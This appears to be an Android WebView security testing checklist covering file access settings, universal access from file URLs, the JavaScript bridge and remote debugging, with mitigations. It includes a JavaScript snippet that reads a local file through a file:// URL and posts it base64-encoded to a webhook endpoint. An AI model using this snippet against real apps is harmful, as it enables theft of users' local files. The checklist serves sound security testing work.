# WebViews

## File Access in WebViews
- By default, WebViews permit file access. This functionality is controlled by the `setAllowFileAccess()` method, available since Android API level 3 (Cupcake 1.5). Applications with the `android.permission.READ_EXTERNAL_STORAGE` permission can read files from external storage using a file URL scheme (file://path/to/file).

- [ ] **Check for `loadURL()` Function**
  - [ ] **Check for `WebView.getSettings().setJavaScriptEnabled(true)`**: This setting allows the execution of JavaScript code within the WebView. WebViews can handle the intent scheme, potentially leading to exploits if not carefully managed. An example vulnerability involved an exposed WebView parameter "url" that could be exploited to execute cross-site scripting (XSS) attacks.

> [!NOTE] 
> This setting alone isn't always sufficient to pose a high security risk. Additional settings need to be checked, such as the following:

- **Deprecated Features: Universal and File Access From URLs**
  - [ ] **Check for `WebView.setAllowUniversalAccessFromFileURLs(true)`**: This setting removes all same-origin policy restrictions and allows the WebView to make requests from file URLs to the web. This can potentially allow an attacker to read local files using JavaScript and send them to an attacker-controlled domain.
  - [ ] **Check for `WebView.setAllowFileAccessFromFileURLs(true)`**: File Access From File URLs > This feature, also deprecated, controlled access to content from other file scheme URLs. Like universal access, its default is disabled for enhanced security.

- **WebViewAssetLoader (Mitigation):**
  - The WebViewAssetLoader class is the modern approach for loading local files. It uses http(s) URLs for accessing local assets and resources, aligning with the Same-Origin policy, thus facilitating CORS management.

- **Javascript Bridge**
  - A feature is provided by Android that enables JavaScript in a WebView to invoke native Android app functions. This is achieved by utilizing the `addJavascriptInterface` method, which integrates JavaScript with native Android functionalities, termed as a WebView JavaScript bridge. Caution is advised as this method allows all pages within the WebView to access the registered JavaScript Interface object, posing a security risk if sensitive information is exposed through these interfaces.

    - Extreme caution is required for apps targeting Android versions below 4.2 due to a vulnerability allowing remote code execution through malicious JavaScript, exploiting reflection.
  - [ ] **Check for `WebView.addJavascriptInterface("OBJECT_OF_JAVA_CLASS", "OBJECT_OF_JAVASCRIPT_CLASS")`**: This setting creates an interface between JavaScript in the WebView and Java code defined in the interface. From the JavaScript object, public functions from the Java object class can be called.

## Example of JavaScript Code for Data Exfiltration

```javascript
<script>
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();

xhr.onreadystatechange = () => {
    if (xhr.readyState === 4) {
        xhr2.open("POST", "https://webhook.site/your-endpoint");
        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr2.send('data=' + btoa(xhr.responseText));
    }
};

xhr.open("GET", "file:///path/to/file", true);
xhr.send();
</script>
```
- [ ] Check for Remote Debugging with `WebView.setWebContentsDebuggingEnabled(true);`
    - If enabled, anyone on the same local network can see , control the WebView and execute JavaScript code.

    - You can test WebView remote debugging using chrome://inspect/#devices in Google Chrome.

## Resources
- [Web view Check list](https://blog.oversecured.com/Android-security-checklist-webview/)
- [HackTricks - WebView](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/webview-attacks)